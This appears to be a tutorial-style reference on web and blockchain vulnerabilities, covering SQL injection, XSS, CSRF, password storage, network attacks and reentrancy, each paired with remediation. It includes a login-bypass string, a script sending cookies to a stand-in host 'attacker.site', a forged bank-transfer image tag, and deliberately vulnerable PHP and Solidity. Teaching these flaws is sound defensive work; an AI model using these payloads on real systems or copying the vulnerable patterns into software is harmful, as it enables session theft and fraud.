VULNERABILITY_01

SQL Injection (SQLi)

Overview

SQL Injection (SQLi) occurs when malicious code is inserted into input strings that are later parsed and executed as database queries. This vulnerability typically occurs when user inputs are directly concatenated into query statements rather than parameterized.

Attack Vector Details

Vulnerable PHP Code
$username = $_POST['user'];
$password = $_POST['pass'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

If an attacker inputs ' OR 1=1 -- in the username field, the compiled SQL query becomes:

Manipulated Query
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'

Since 1=1 is always true, and the comment double hyphen -- terminates the rest of the statement, the database executes the query, returns the first user (usually the administrator), and bypasses login completely.

Remediation

  • Parameterized Queries: Use Prepared Statements where input is treated strictly as data.
  • Object Relational Mapping (ORM): Utilize ORM frameworks like SQLAlchemy or Hibernate which parameterize queries by default.
  • Principle of Least Privilege: Configure database users to have access permissions only to necessary tables.
VULNERABILITY_02

Cross-Site Scripting (XSS)

Overview

Cross-Site Scripting (XSS) enables attackers to inject client-side scripts (usually JavaScript) into web pages viewed by other users. The browser cannot detect that the script is malicious and executes it inside the context of the session.

Attack Vector Details

There are three major classifications of XSS:

  1. Stored XSS: The malicious script is permanently stored on a target server (e.g., in a comments database). When another user accesses the page, the script executes.
  2. Reflected XSS: The script is embedded in a malicious URL and reflected off the server response back to the victim (e.g., in query parameter search results).
  3. DOM-based XSS: The exploit executes entirely in the client-side JavaScript by parsing URL inputs directly into dangerous sinks like element.innerHTML.
Sample Stored Payload
<script>
  // Transmits cookies to attacker's server
  fetch('https://attacker.site/log?cookie=' + document.cookie);
</script>

Remediation

  • Contextual Output Escaping: Convert characters like < and > to safe HTML entities (&lt;, &gt;) before outputting.
  • Content Security Policy (CSP): Configure HTTP headers defining allowed origins for scripting files.
  • HttpOnly Cookies: Prevent JavaScript from reading sensitive session cookies via document.cookie.
VULNERABILITY_03

Cross-Site Request Forgery (CSRF)

Overview

CSRF is an attack vector that tricks an authenticated user into performing unauthorized actions on a website they are logged into. Because cookies are sent automatically with requests, the target website cannot differentiate between a request made by the user intentionally and a request forged by an external site.

Attack Vector Details

Imagine a user is logged into their bank account at bank.com. The user clicks a link to a malicious website, which loads a hidden image tag:

Forged GET Request
<img src="https://bank.com/transfer?amount=1000&to=attacker_acct" width="0" height="0" />

The browser automatically appends the user's active session cookie for bank.com when sending the request, resulting in a successful transfer without the user's knowledge.

Remediation

  • Anti-CSRF Tokens: Use unique, secure, session-bound secrets that must be sent in every state-changing form (e.g. POST, PUT).
  • SameSite Cookies: Enforce the SameSite=Strict or SameSite=Lax attribute to prevent cookies from being sent along with third-party cross-site requests.
  • MFA: Request multi-factor confirmation for critical account modifications.
VULNERABILITY_04

Password Security

Overview

Password security involves creating passwords that are mathematically resistant to automated cracking tools and storing credentials using cryptographic hash algorithms designed to prevent brute force recovery.

Cracking Methods

  • Brute Force: Running through all possible character combinations until a match is found.
  • Dictionary Attacks: Testing lists of common passwords, words from dictionaries, and leaked database credentials.
  • Rainbow Tables: Precomputed databases of hashed dictionary files.

Secure Storage

Passwords should never be stored in plaintext. They must be salted (appended with unique random bytes) and hashed using CPU-heavy algorithms like bcrypt, Argon2, or PBKDF2 to maximize the computing cost for crack pipelines.

VULNERABILITY_05

Networking Protocols

Overview

Network-level security focuses on secure configuration, access control, and cryptographic encryption for data in transit across TCP/IP models.

Common Hazards

  • Man-in-the-Middle (MitM): Attackers capture packets of local traffic using ARP spoofing or unencrypted Wi-Fi sniffs.
  • Port Scans: Using tools like Nmap to find listening network ports and map application versions for known exploits.
  • Denial of Service (DoS): Flooding a system's port buffers with handshake requests (e.g. SYN Flood) to exhaust memory.

Defenses

  • HTTPS / TLS: Encrypt HTTP request/response pipelines.
  • Firewalls: Filter incoming network ports and block unsolicited IP ranges.
  • Intrusion Detection (IDS): Monitor signature patterns for unauthorized behavior.
VULNERABILITY_06

Blockchain Exploits

Overview

Blockchain security covers auditing distributed ledger technologies, consensus protocols, and programming errors in executable smart contract systems.

Smart Contract Errors

The most famous smart contract vulnerability is the **Reentrancy attack** (which led to the DAO hack). It occurs when a smart contract transfers ether to an untrusted contract *before* updating its internal balance state.

Vulnerable Solidity function
function withdraw() public {
    uint bal = userBalances[msg.sender];
    require(bal > 0);
    // Sends ether - triggers attacker fallback function
    (bool sent, ) = msg.sender.call{value: bal}(""); 
    require(sent);
    userBalances[msg.sender] = 0; // State updated TOO LATE
}

The attacker's fallback function calls withdraw() again. Since userBalances is still not updated to 0, the contract transfers funds repeatedly until its entire reserve is exhausted.
